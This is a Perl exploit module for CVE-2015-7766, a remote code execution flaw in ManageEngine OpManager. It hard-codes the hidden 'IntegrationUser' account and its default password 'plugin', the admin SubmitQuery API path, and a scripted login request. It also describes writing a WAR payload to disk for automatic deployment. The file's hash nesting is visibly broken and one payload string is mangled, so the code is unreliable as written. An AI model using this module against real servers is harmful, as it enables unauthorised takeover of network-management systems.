package MANAGE::MSF::ManageEngineOpmanagerRce;
use lib qw(../../); use parent qw(Exploit);

use 5.10.0;

use strict;
use warnings;

no warnings 'experimental';

use URI::URL;
use Data::Dump qw(dump);
use File::Slurp qw(read_file);

# # 
# # 
# # 

sub load {
    my $type  = shift;
    my $class = ref $type || $type;
    my $self = { };
    bless $self, $class;

    return $self;
}

sub new {
   my $class = shift;
   

   my $name = "ManageEngineOpmanagerRce";

   my $DETECTION = {

   };

my $EXPLOIT = {
  CVE => "CVE-2015-7766",
  DESCRIPTION => "

        This module exploits a default credential vulnerability in ManageEngine OpManager, where a

        default hidden account \"IntegrationUser\" with administrator privileges exists. The account

        has a default password of \"plugin\" which cannot be reset through the user interface. By

        log-in and abusing the default administrator's SQL query functionality, it's possible to

        write a WAR payload to disk and trigger an automatic deployment of this payload. This

        module has been tested successfully on OpManager v11.0 and v11.4-v11.6 for Windows.

      ",
  DOMAINTITLE => "NULL",
  METHOD => "",
  MSF_MODULE => "manage_engine_opmanager_rce",
  PATH => "api/json/admin/SubmitQuery?apiKey=__APIKEY__&",
  PATHS => ["api/json/admin/SubmitQuery", "jsp/Login.do"],
  PAYLOAD => "domainName=NULL&authType=localUserLogin&userName=IntegrationUser&#Hiddenuserpassword=plugin#Passwordofhiddenuser&",
  REFERENCES => [
    "http://seclists.org/fulldisclosure/2015/Sep/66",
    "https://support.zoho.com/portal/manageengine/helpcenter/articles/pgsql-submitquery-do-vulnerability",
  ],
  TITLE => "ManageEngine OpManager Remote Code Execution",
  USERTITLE => "IntegrationUser",
  VARIABLES => {
    'QUERY' =>       { DESCRIPTION => "", VALUE => "" },
    'APIKEY' =>       { DESCRIPTION => "", VALUE => "" },
  },
      },  VALIDATION => {
    'TREGEX' =>       "window.\\(?:OPM.\\)?apiKey = \"\\([a-z0-9]+\\)\"",

  TYPE => 'MSF',
  PLATFORM => 'WINDOWS',
  REQUESTS => {
    EXPLOIT2 => {
      METHOD       => 'POST',
      PATH   => 'jsp/Login.do',
      PAYLOAD      => 'domainName=NULL&authType=localUserLogin&userName=IntegrationUser&password=plugin',
      TEXT   => 'Sending Exploit #2 Request : [POST] /jsp/Login.do',
      HEADERS      => {
        'Content-Type' => 'application/x-www-form-urlencoded',
      },
      VALIDATION   => {
        TCODE => ['200'],
      },
    },
  },
   };

   return $class->SUPER::new($name, $DETECTION, $EXPLOIT, @_);
}

return 1;
